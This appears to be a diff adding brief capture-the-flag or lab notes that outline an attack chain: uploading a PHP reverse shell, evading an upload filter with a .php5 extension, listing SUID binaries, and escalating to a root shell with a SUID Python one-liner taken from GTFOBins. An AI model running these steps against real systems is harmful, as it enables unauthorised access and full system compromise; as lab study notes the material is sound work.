@@ -1,0 +1,13 @@
+Step 1 : Uploading php Reverse shell
+
+Step 2 : Bypass php filter using different file extension e.g .php5
+
+Step 3 : Privilledge Escalation Using SUID BIT 
+  find / -perm /4000 2>/dev/null
+  
+  
+  Use which Python to find location 
+    /usr/bin/python
+ 
+Step 4 : Use GTOBIN to find how to priv esc
+    /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'  
